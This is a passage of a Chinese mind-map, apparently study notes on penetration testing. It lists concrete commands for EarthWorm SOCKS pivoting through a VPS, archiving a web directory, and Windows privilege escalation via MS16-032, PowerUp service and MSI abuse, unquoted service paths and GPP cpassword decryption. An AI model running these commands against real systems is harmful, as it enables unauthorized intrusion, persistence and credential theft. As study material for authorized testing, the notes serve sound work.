      &lt;node TEXT=&quot;iodine[kali内置]&quot; ID=&quot;21317362352b6e03a&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;太复杂了，自己百度&quot; ID=&quot;39d17362353adb08&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;Socks代理&quot; ID=&quot;bd173623644b4074&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;常用Socks代理工具&quot; ID=&quot;3211736236b0e2067&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;EarthWorm、reGeorg、sSocks、SocksCap64、Proxifier、proxyChains&quot; ID=&quot;c2173623e1b7c168&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;EarthWorm&quot; ID=&quot;1c5173623ed294194&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;正向Socks 5 &quot; ID=&quot;3c9173623ee4fa006&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;适用于目标机器拥有外网IP: ew -s ssocksd -l 888&quot; ID=&quot;1e4173623f3a2c038&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;反向Socks 5&quot; ID=&quot;2711736240783a081&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;VPS上执行：ew -s rcsocks -l 1008 -e 888  内网机器执行：ew -s rssocks -d VPS_IP -e 888&quot; ID=&quot;e117362409341115&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;二级内网代理&quot; ID=&quot;10b173624292920c9&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;边界机器有外网IP&quot; ID=&quot;1de1736242c58a133&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;二级内网机器执行：ew -s ssocksd -l 888&quot; ID=&quot;1df17362456fe1051&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;边界机器执行： ew -s lcx_tran -l 1080 -f 二级内网机器IP -g 888&quot; ID=&quot;ac1736245d2a118b&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;设置Socks5代理为边界机器外网IP:1080&quot; ID=&quot;3db17362472ad912e&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;边界机器无外网IP&quot; ID=&quot;c5173624795eb00b&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;VPS上执行：ew -s lcx_listen -l 1080 -e 888&quot; ID=&quot;491736247b139005&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;二级内网机器执行：ew -s ssocksd -l 999&quot; ID=&quot;10d17362489141171&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;边界机器上执行：ew -s lcx_slave -d VPS_IP -e 888 -f 二级内网机器IP -g 999&quot; ID=&quot;1781736249312914c&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;压缩数据&quot; ID=&quot;a8173624d97100e&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;RAR&quot; ID=&quot;77173624da6c2016&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;常见参数&quot; ID=&quot;20173624e24e0143&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;a 添加要压缩的文件&quot; ID=&quot;1c5173624e4c68076&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-k 锁定压缩文件&quot; ID=&quot;332173624e730a01b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-s 生成存档文件&quot; ID=&quot;1b5173624e9669169&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-p 指定压缩密码&quot; ID=&quot;be173624ec2f20df&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-r 递归压缩，包括子目录&quot; ID=&quot;321173624edf8814b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-x 指定要排除的文件&quot; ID=&quot;1ec173624f10e003d&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-v 分卷压缩&quot; ID=&quot;3ce173624f35a0127&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-ep 从名称中排除路径&quot; ID=&quot;13c173624f55d111a&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-m&quot; ID=&quot;26c173624f74b0067&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;-m0 存储，添加到压缩文件时不压缩文件&quot; ID=&quot;a3173624f8d11044&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;-m1 最快&quot; ID=&quot;17d173624fda4a017&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;-m2 较快&quot; ID=&quot;3b817362501a08177&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;-m3 标准&quot; ID=&quot;3e2173625032ba039&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;-m4 较好&quot; ID=&quot;25417362504bf1122&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;-m5 最好&quot; ID=&quot;3701736250669a0cf&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;将e:\web\目录下所有文件打包为1.rar 放到e:\web\目录下&quot; ID=&quot;1591736253bc2801c&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;rar.exe a -k -r -s -m3 E:\web\1.rar E:\web&quot; ID=&quot;26017362546482185&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;7-Zip&quot; ID=&quot;a2173625adfa1103&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;常见参数&quot; ID=&quot;77173625af8890df&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;-r 递归压缩&quot; ID=&quot;37173625b0db8132&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-o 指定输入目录&quot; ID=&quot;102173625b288904e&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-p 指定密码&quot; ID=&quot;a7173625b46b90ef&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-v 分卷压缩&quot; ID=&quot;1e7173625b628110f&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;a 添加压缩文件&quot; ID=&quot;262173625b7ba80c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;将e:\web\目录下所有文件打包为1.rar 放到e:\web\目录下&quot; ID=&quot;5e173625bef0f06&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;7z.exe a -r -p 123456 E:\web\1.7z E:\web\&quot; ID=&quot;31b173625bf3a113e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;上传和下载[这一节，书的内容全是瞎抄CSDN]&quot; ID=&quot;30f173625c90e012b&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;利用FTP协议上传&quot; ID=&quot;4c173625ca47717b&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;利用VBS上传&quot; ID=&quot;5d173625cc4a0072&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;利用Debug上传&quot; ID=&quot;11e173625d0fc8077&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;利用NiShang上传&quot; ID=&quot;1e81736261345811d&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;利用bitsadmin下载&quot; ID=&quot;29a1736261511e112&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
&lt;/node&gt;
&lt;node TEXT=&quot;四、权限 提升&quot; ID=&quot;1781735a6a92ca131&quot; STYLE=&quot;bubble&quot; POSITION=&quot;right&quot;&gt;
  &lt;node TEXT=&quot;系统内核溢出漏洞提权&quot; ID=&quot;11a17369fcdb1d0f5&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;手动执行命令发现缺失补丁&quot; ID=&quot;11817369e768f3077&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;wmic qfe get Caption,Description,HotFixID,InstalledOn&quot; ID=&quot;29c17369e7b26d159&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;MS16-032&quot; ID=&quot;24017369f21b54024&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;导入Invoke-MS16-032.ps1后，Invoke-MS16-032 -Application cmd.exe -Command &amp;quot;/c net user 1 1 /add&amp;quot;&quot; ID=&quot;15717369f22fe418a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;利用Metasploit发现缺失补丁&quot; ID=&quot;1cf17369f355c4094&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;use post/windows/gather/enum_patches&quot; ID=&quot;1e317369f3874e00a&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Windows Exploit Suggester&quot; ID=&quot;36e17369f5165b113&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;更新漏洞库：./windows-exploit-suggester.py --update&quot; ID=&quot;21617369f535dc176&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;查找漏洞：./windows-exploit-suggester.py -d 2020-07-20-mssb.xls -i patches.txt(patches.txt内容为systeminfo命令结果)&quot; ID=&quot;14f17369f623640cf&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;PowerShell中的Sherlock脚本[下载链接：https://github.com/rasta-mouse/Sherlock]&quot; ID=&quot;34517369f734e40bf&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;导入：Import-Module c:\Sherlock.ps1&quot; ID=&quot;39917369f75f1316b&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;查找漏洞：Find-AllVulns&quot; ID=&quot;c517369fc0bec078&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;系统配置错误利用&quot; ID=&quot;2117369fd155c0d5&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;系统服务权限配置错误&quot; ID=&quot;27f17369fd9214041&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;PowerUp下的实战利用[下载链接：https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 ]&quot; ID=&quot;27617369fdc234046&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;powershell.exe -exec bypass -Command &amp;quot;&amp;amp; &#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&amp;quot;&quot; ID=&quot;b417369fe3f1c049&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;OmniServers服务漏洞(利用Install-ServiceBinary模块通过WriteServiceBinary编写一个C#服务来添加用户。重启系统，该服务将停止运行并自动添加用户)&quot; ID=&quot;1b01736a010caa108&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;powershell.exe -exec bypass -Command &amp;quot;&amp;amp; &#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &amp;apos;OmniServers&amp;apos; -UserName shuteer -Password Password123!&#125;&amp;quot;&quot; ID=&quot;23e1736a013a030be&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;Metasploit下的实战利用&quot; ID=&quot;1b21736a04c97c188&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;把meterpreter shell转为后台执行&quot; ID=&quot;3101736a0c2084038&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;use exploit/windows/local/service_permissions 设置SESSION为后台的ID，执行run之后，系统将自动反弹一个新的meterpreter,getuid为system&quot; ID=&quot;2a01736a04e9a4113&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;注册表键AlwaysInstallElevated&quot; ID=&quot;2571736a0da202012&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;Windows允许低权限用户以system权限运行安装文件，如果启用此策略选项，那么任何权限用户都能以 NT AUTHORITY\SYSTEM权限来安装恶意的MSI文件&quot; ID=&quot;2731736a0dd6e4073&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;AlwaysInstallElevated漏洞产生原因&quot; ID=&quot;491736a10a5950b5&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;运行gpedit.msc打开组策略&quot; ID=&quot;3891736a12cc5403f&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;组策略--计算机配置--管理模板--Windows 组件--Windows Installer--永远以高特权进行安装 ，选择启用&quot; ID=&quot;2a1736a110662144&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;组策略--用户配置--管理模板--Windows 组件--Windows Installer--永远以高特权进行安装 ，选择启用&quot; ID=&quot;32e1736a12b136058&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;PowerUp下的实战&quot; ID=&quot;2d41736a1334740cc&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;powershell.exe -exec bypass -Command &amp;quot;&amp;amp; &#123;Import-Module .\PowerUp.ps1;Get-RegAlwaysInstallElevated&#125;&amp;quot;   返回true，即存在该漏洞&quot; ID=&quot;2771736a1370030e1&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;powershell.exe -exec bypass -Command &amp;quot;&amp;amp; &#123;Import-Module .\PowerUp.ps1;WriteUserAddMSI&#125;&amp;quot;  生成添加用户的msi&quot; ID=&quot;3381736a14bb4d038&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;msiexec /q /i useradd.msi &quot; ID=&quot;17b1736a1ad7dc02b&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;/quiet: 在安装过程中禁止向用户发送消息&quot; ID=&quot;3b41736a1fc2c41&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;/qn: 不使用GUI&quot; ID=&quot;1fe1736a1ff17314a&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;/i：安装程序&quot; ID=&quot;1b01736a2009f502e&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;也可以用MSFr exploit/windows/local/always_install_elevated模块&quot; ID=&quot;2be1736a20644b0c9&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;可信任服务路径漏洞&quot; ID=&quot;2271736a21123b0c2&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;Trusted Service Paths 漏洞产生的原因&quot; ID=&quot;541736a21379b05c&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Windows服务通常以system权限运行，所以系统 在解析服务所对应的文件路径中的空格时，也会以系统权限进行&quot; ID=&quot;1451736a2258a4073&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;Metasploit下的实战利用&quot; ID=&quot;1ed1736a23327d06e&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;wmic service get name,displayname,pathname,startmode | findstr /i &amp;quot;Auto&amp;quot; | findstr /i /v &amp;quot;C:\windows\\&amp;quot; | findstr /i /v &amp;quot;&amp;quot;&amp;quot;   查看服务对应的路径包含空格且没有被引号引起来&quot; ID=&quot;3221736a235a6b03e&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;检测是否有对目标文件夹的写权限 ：icacls &amp;quot;c:\program Files\grogram folder&amp;quot;&quot; ID=&quot;c81736a316314163&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;Everyone:(OI)(CI)(F)&quot; ID=&quot;2fc1736a3563cc06a&quot; STYLE=&quot;fork&quot;&gt;
            &lt;node TEXT=&quot;(M) 修改&quot; ID=&quot;321736a35deec041&quot; STYLE=&quot;fork&quot;/&gt;
            &lt;node TEXT=&quot;(F) 完全控制 &quot; ID=&quot;3401736a35fa6c18f&quot; STYLE=&quot;fork&quot;/&gt;
            &lt;node TEXT=&quot;(CI) 从属容器将继承访问控制基&quot; ID=&quot;1da1736a36120c10b&quot; STYLE=&quot;fork&quot;/&gt;
            &lt;node TEXT=&quot;(OI)  从属文件将继承访问控制基&quot; ID=&quot;2d01736a36563b09d&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;/node&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;确认存在漏洞后，把要上传的程序重命名并放置在此漏洞且可写的目录，尝试重启服务&quot; ID=&quot;1ca1736a36bf7416f&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;sc stop service_name&quot; ID=&quot;3641736a374912082&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;sc start service_name&quot; ID=&quot;3b61736a37642b086&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;msf trusted_serivce_path模块&quot; ID=&quot;1081736a3793e3136&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;自动安装配置文件&quot; ID=&quot;e51736a38377a04d&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;常见配置文件列表[常包含帐号密码]&quot; ID=&quot;22f1736a3874d208e&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;c:\sysprep.inf&quot; ID=&quot;3261736a39b02205d&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;C:\sysprep\sysprep.xml&quot; ID=&quot;2b21736a3a92951531&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;c:\windows\system32\sysprep.xml&quot; ID=&quot;32c1736a3aa5c2075&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;c:\windows\system32\sysprep\sysprep.xml&quot; ID=&quot;221736a3b2d030e1&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;c:\Unattended.xml&quot; ID=&quot;19a1736a3c64fa078&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;C:\Windows\Panther\Unattend.xml&quot; ID=&quot;1f01736a3d6aea0f7&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;C:\Windows\Panther\Unattended.xml&quot; ID=&quot;1041736a3d79ca08f&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;C:\Windows\Panther\Unattend\Unattend.xml&quot; ID=&quot;1ae1736a3da2da074&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;C:\Windows\Panther\Unattend\Unattended.xml&quot; ID=&quot;1cf1736a3a929500d2&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;c:\windows\system32\sysprep\Unattend.xml&quot; ID=&quot;2b1736a3a92951533&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;c:\windows\system32\sysprep\Panther\Unattend.xml&quot; ID=&quot;1731736a3e0b5a11a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;Metasploit脚本：post/windows/gather/enum_unattend&quot; ID=&quot;ac1736a3e9ff9031&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;计划任务&quot; ID=&quot;1481736a3f694a002&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;查看计划任务：schtasks /query /fo LIST /v&quot; ID=&quot;26f1736a3f7cea04e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;如果对高权限运行的任务计划所在的目录有写权限，就可以使用恶意程序覆盖原来的程序&quot; ID=&quot;32c1736a4070eb0e8&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;自动接受许可协议 accesschk.exe /accepteula  &quot; ID=&quot;3d51736a40f26311b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;列出所有权限 配置有缺陷的文件夹&quot; ID=&quot;1f21736a4399fa157&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;accesschk.exe -qwsu &amp;quot;Users&amp;quot; *&quot; ID=&quot;1c21736a416dec18e&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;accesschk.exe -qwsu &amp;quot;Authenticated Users&amp;quot; *&quot; ID=&quot;8d1736a43188a09&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;accesschk.exe -qwsu &amp;quot;Everyone&amp;quot; *&quot; ID=&quot;2d81736a43311b0f9&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Empire 内置模块&quot; ID=&quot;2111736a441eea004&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;usemodule privesc/powerup/   然后按tab键可查看powerup的模块列表&quot; ID=&quot;511736a45c9db024&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;usemodule privesc/powerup/allchecks再输入execute可自动执行全部检查&quot; ID=&quot;c91736a46d4bd0e8&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;没有被 引号引起来的服务路径&quot; ID=&quot;1701736a473dcb068&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;ACL配置错误的服务&quot; ID=&quot;1261736a47657413d&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;服务的可执行文件的权限 设置不当&quot; ID=&quot;b21736a4781c300b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;Unattend.xml&quot; ID=&quot;e01736a47b10b0b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;注册表键AlwaysInstallElevated&quot; ID=&quot;1ab1736a47d0fc0ae&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;如果有Autologon凭证，都会留在注册表中&quot; ID=&quot;2b81736a4819ab093&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;加密的web.config字符串和应用程序池中的密码&quot; ID=&quot;941736a485c2407f&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;%PATH% .dll 的劫持机会&quot; ID=&quot;1841736a48a3440be&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;组策略首选项&quot; ID=&quot;b61736a48edc318e&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;常见的组策略首选项&quot; ID=&quot;3541736a4928fc0ee&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;映射驱动器&quot; ID=&quot;23c1736a4984d90ae&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;创建本地用户&quot; ID=&quot;1711736a49a3d2112&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;数据 源&quot; ID=&quot;1f51736a49b532189&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;打印机配置&quot; ID=&quot;2091736a49c0530b9&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;创建/更新服务&quot; ID=&quot;2191736a49cda314e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;计划任务&quot; ID=&quot;3281736a49e50a02b&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;获取组策略的凭据&quot; ID=&quot;2141736a85d150145&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;管理员在域中新建一个组策略后，操作系统 会自动在SYSVOL共享目录中生成一个XML文件，该文件保持了组策略更新后的密码。&quot; ID=&quot;11736a8be312161&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;手动搜索： type \\dc\SYSVOL\domain\Policies\&#123;ABDAFB3B-920B-4A1A-9B47-B0D8721244D4&#125;\Machine\Preferences\Groups\Groups.xml&quot; ID=&quot;1c81736a8d0411138&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;解密：  python gpprefdecrypt.py LdN1Ot2OiiJSC/e+nROCMw&quot; ID=&quot;1921736a8e5c11096&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;Powershell获取 &quot; ID=&quot;3821736a8eff29056&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;PowerSploit中的Get-GPPPassword.ps1&quot; ID=&quot;a71736a8f29a008c&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;Metasploit查询cpassword&quot; ID=&quot;2651736a909ea8139&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;use post/windows/gather/credentials/gpp&quot; ID=&quot;2c81736a90c59111d&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;使用Empire查找cpassword&quot; ID=&quot;351736a9113e215d&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;usemodule privesc/gpp&quot; ID=&quot;1271736a91557f03e&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;其它配置文件&quot; ID=&quot;3d01736a9203e00a1&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;Services\Services.xml&quot; ID=&quot;6a1736a92278809c&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;ScheduledTasks\ScheduledTasks.xml&quot; ID=&quot;3b71736a92417a0bb&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;Printers\Printers.xml&quot; ID=&quot;26e1736a9267f0185&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;Drives\Drives.xml&quot; ID=&quot;1101736a92815a004&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;DataSources\DataSources.xml&quot; ID=&quot;3971736a92a3a001e&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;&quot; ID=&quot;a01736a92c158072&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;绕过UAC提权&quot; ID=&quot;3921736a930578078&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;需要UAC授权的操作如下：&quot; ID=&quot;31736a9323a0128&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;配置Windows Update&quot; ID=&quot;3591736a938c0009e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;增加/删除用户&quot; ID=&quot;1051736a93b05815c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;更改帐户类型&quot; ID=&quot;1e21736a93c8c9184&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;更改UAC设置&quot; ID=&quot;2491736a93da49143&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;安装 ActiveX&quot; ID=&quot;29c1736a93f10a0d7&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;安装/卸载程序 &quot; ID=&quot;1aa1736a94050018b&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;安装 设备驱动程序 &quot; ID=&quot;b1736a94266918d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;将文件移动/复制到program files或windows目录下&quot; ID=&quot;1161736a9449c103d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;查看其它用户的文件夹&quot; ID=&quot;1971736a94ae80177&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;UAC的四种设置要求&quot; ID=&quot;821736a94de90197&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;始终通知：每当有程序 需要使用高级别的权限 时都会提示本地用户&quot; ID=&quot;2811736a9513b802d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;仅在程序 试图更改我的计算机时通知我：默认设置。当第三方程序 使用高级别的权限 时会提示本地用户&quot; ID=&quot;1b01736a9566670ca&quot; STYLE=&quot;fork&quot;/&gt;
